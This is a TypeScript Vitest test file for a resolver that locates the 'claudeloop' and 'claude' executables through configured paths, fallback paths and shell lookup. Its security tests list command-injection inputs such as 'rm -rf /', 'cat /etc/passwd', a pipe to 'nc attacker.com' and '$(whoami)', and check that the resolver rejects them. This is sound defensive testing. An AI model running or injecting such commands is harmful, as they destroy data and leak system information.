import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import {
  resolveClaudeloopPath,
  resolveClaudePath,
  type PathResolverDeps,
  type ResolvedPath,
} from "../../../core/pathResolver";

function makeDeps(overrides: Partial<PathResolverDeps> = {}): PathResolverDeps {
  return {
    execFile: vi.fn().mockRejectedValue(new Error("not found")),
    fileExists: vi.fn().mockResolvedValue(false),
    env: { SHELL: "/bin/zsh" },
    platform: "darwin",
    homeDir: "/Users/test",
    ...overrides,
  };
}

describe("resolveClaudeloopPath", () => {
  describe("configured absolute path", () => {
    it("returns configured path when it contains / and exists", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(true),
      });

      const result = await resolveClaudeloopPath("/custom/path/claudeloop", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/custom/path/claudeloop",
        source: "configured",
      });
      expect(deps.fileExists).toHaveBeenCalledWith("/custom/path/claudeloop");
      expect(deps.execFile).not.toHaveBeenCalled();
    });

    it("returns null when configured absolute path does not exist", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
      });

      const result = await resolveClaudeloopPath("/missing/claudeloop", deps);

      expect(result).toBeNull();
    });

    it("treats relative path with / as configured path", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(true),
      });

      const result = await resolveClaudeloopPath("./bin/claudeloop", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "./bin/claudeloop",
        source: "configured",
      });
    });
  });

  describe("fallback paths", () => {
    it("tries ~/.local/bin/claudeloop first for bare command", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/Users/test/.local/bin/claudeloop")
        ),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/Users/test/.local/bin/claudeloop",
        source: "fallback",
      });
    });

    it("tries /usr/local/bin/claudeloop as second fallback", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/usr/local/bin/claudeloop")
        ),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/usr/local/bin/claudeloop",
        source: "fallback",
      });
    });

    it("tries ~/bin/claudeloop as third fallback", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/Users/test/bin/claudeloop")
        ),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/Users/test/bin/claudeloop",
        source: "fallback",
      });
    });

    it("tries /opt/homebrew/bin/claudeloop on macOS ARM", async () => {
      const deps = makeDeps({
        platform: "darwin",
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/opt/homebrew/bin/claudeloop")
        ),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/opt/homebrew/bin/claudeloop",
        source: "fallback",
      });
    });
  });

  describe("shell resolution", () => {
    it("resolves via shell when fallbacks fail", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockResolvedValue({
          stdout: "/home/user/.local/bin/claudeloop\n",
        }),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/home/user/.local/bin/claudeloop",
        source: "shell",
      });
      expect(deps.execFile).toHaveBeenCalledWith(
        "/bin/zsh",
        ["-lc", "command -v claudeloop"],
        expect.objectContaining({ timeout: 5000 })
      );
    });

    it("uses SHELL env var for shell command", async () => {
      const deps = makeDeps({
        env: { SHELL: "/bin/bash" },
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockResolvedValue({
          stdout: "/usr/bin/claudeloop\n",
        }),
      });

      await resolveClaudeloopPath("claudeloop", deps);

      expect(deps.execFile).toHaveBeenCalledWith(
        "/bin/bash",
        ["-lc", "command -v claudeloop"],
        expect.any(Object)
      );
    });

    it("falls back to /bin/sh when SHELL not set", async () => {
      const deps = makeDeps({
        env: {},
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockResolvedValue({
          stdout: "/usr/bin/claudeloop\n",
        }),
      });

      await resolveClaudeloopPath("claudeloop", deps);

      expect(deps.execFile).toHaveBeenCalledWith(
        "/bin/sh",
        ["-lc", "command -v claudeloop"],
        expect.any(Object)
      );
    });

    it("returns null when shell resolution returns empty", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockResolvedValue({ stdout: "\n" }),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result).toBeNull();
    });

    it("returns null when shell resolution fails", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockRejectedValue(new Error("command not found")),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result).toBeNull();
    });
  });

  describe("timeout handling", () => {
    beforeEach(() => {
      vi.useFakeTimers();
    });

    afterEach(() => {
      vi.useRealTimers();
    });

    it("returns null when shell resolution times out and no fallbacks exist", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockImplementation(
          () => new Promise(() => {}) // never resolves
        ),
      });

      const resultPromise = resolveClaudeloopPath("claudeloop", deps);
      await vi.advanceTimersByTimeAsync(5000);
      const result = await resultPromise;

      expect(result).toBeNull();
    });
  });

  describe("Windows platform", () => {
    it("skips shell resolution on Windows", async () => {
      const deps = makeDeps({
        platform: "win32",
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn(),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(deps.execFile).not.toHaveBeenCalled();
      expect(result).toBeNull();
    });

    it("still checks fallback paths on Windows", async () => {
      const deps = makeDeps({
        platform: "win32",
        homeDir: "C:\\Users\\test",
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p.includes("claudeloop"))
        ),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result?.source).toBe("fallback");
    });
  });

  describe("edge cases", () => {
    it("trims whitespace from shell output", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockResolvedValue({
          stdout: "  /usr/local/bin/claudeloop  \n",
        }),
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result?.path).toBe("/usr/local/bin/claudeloop");
    });

    it("uses first fallback found, not all", async () => {
      const fileExistsMock = vi.fn()
        .mockResolvedValueOnce(true) // ~/.local/bin/claudeloop
        .mockResolvedValueOnce(true); // /usr/local/bin/claudeloop

      const deps = makeDeps({
        fileExists: fileExistsMock,
      });

      const result = await resolveClaudeloopPath("claudeloop", deps);

      expect(result?.path).toBe("/Users/test/.local/bin/claudeloop");
      // Should stop after first match
      expect(fileExistsMock).toHaveBeenCalledTimes(1);
    });
  });

  describe("security", () => {
    it("rejects commands with shell metacharacters", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn(),
      });

      // These should not trigger shell execution
      const maliciousCommands = [
        "claudeloop; rm -rf /",
        "claudeloop && cat /etc/passwd",
        "claudeloop | nc attacker.com 1234",
        "$(whoami)",
        "`id`",
        "claudeloop$(id)",
      ];

      for (const cmd of maliciousCommands) {
        const result = await resolveClaudeloopPath(cmd, deps);
        expect(result).toBeNull();
        // Should not call shell for unsafe commands (they contain /, so treated as configured)
      }
    });

    it("allows safe command names", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockResolvedValue({ stdout: "/usr/bin/claudeloop\n" }),
      });

      // Safe command names
      const safeCommands = ["claudeloop", "claude-loop", "claudeloop_dev", "claudeloop.exe"];

      for (const cmd of safeCommands) {
        await resolveClaudeloopPath(cmd, deps);
      }

      // All should have triggered shell resolution
      expect(deps.execFile).toHaveBeenCalledTimes(safeCommands.length);
    });

    it("rejects commands with spaces", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn(),
      });

      const result = await resolveClaudeloopPath("claude loop", deps);

      expect(result).toBeNull();
      expect(deps.execFile).not.toHaveBeenCalled();
    });
  });
});

describe("resolveClaudePath", () => {
  describe("configured absolute path", () => {
    it("returns configured path when it contains / and exists", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(true),
      });

      const result = await resolveClaudePath("/custom/path/claude", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/custom/path/claude",
        source: "configured",
      });
    });

    it("returns null when configured absolute path does not exist", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
      });

      const result = await resolveClaudePath("/missing/claude", deps);

      expect(result).toBeNull();
    });
  });

  describe("fallback paths", () => {
    it("tries /opt/homebrew/bin/claude first on macOS", async () => {
      const deps = makeDeps({
        platform: "darwin",
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/opt/homebrew/bin/claude")
        ),
      });

      const result = await resolveClaudePath("claude", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/opt/homebrew/bin/claude",
        source: "fallback",
      });
    });

    it("tries /usr/local/bin/claude as fallback", async () => {
      const deps = makeDeps({
        platform: "darwin",
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/usr/local/bin/claude")
        ),
      });

      const result = await resolveClaudePath("claude", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/usr/local/bin/claude",
        source: "fallback",
      });
    });

    it("tries ~/.local/bin/claude as fallback", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/Users/test/.local/bin/claude")
        ),
      });

      const result = await resolveClaudePath("claude", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/Users/test/.local/bin/claude",
        source: "fallback",
      });
    });

    it("tries ~/bin/claude as fallback", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/Users/test/bin/claude")
        ),
      });

      const result = await resolveClaudePath("claude", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/Users/test/bin/claude",
        source: "fallback",
      });
    });

    it("does not include /opt/homebrew/bin/claude on non-macOS", async () => {
      const deps = makeDeps({
        platform: "linux",
        fileExists: vi.fn().mockImplementation((p: string) =>
          Promise.resolve(p === "/opt/homebrew/bin/claude")
        ),
      });

      const result = await resolveClaudePath("claude", deps);

      // Should not find it because /opt/homebrew is macOS-only
      expect(result).toBeNull();
    });
  });

  describe("shell resolution", () => {
    it("resolves via shell when fallbacks fail", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockResolvedValue({
          stdout: "/home/user/.npm-global/bin/claude\n",
        }),
      });

      const result = await resolveClaudePath("claude", deps);

      expect(result).toEqual<ResolvedPath>({
        path: "/home/user/.npm-global/bin/claude",
        source: "shell",
      });
      expect(deps.execFile).toHaveBeenCalledWith(
        "/bin/zsh",
        ["-lc", "command -v claude"],
        expect.objectContaining({ timeout: 5000 })
      );
    });

    it("returns null when all resolution methods fail", async () => {
      const deps = makeDeps({
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn().mockRejectedValue(new Error("not found")),
      });

      const result = await resolveClaudePath("claude", deps);

      expect(result).toBeNull();
    });
  });

  describe("Windows platform", () => {
    it("skips shell resolution on Windows", async () => {
      const deps = makeDeps({
        platform: "win32",
        fileExists: vi.fn().mockResolvedValue(false),
        execFile: vi.fn(),
      });

      const result = await resolveClaudePath("claude", deps);

      expect(deps.execFile).not.toHaveBeenCalled();
      expect(result).toBeNull();
    });
  });
});
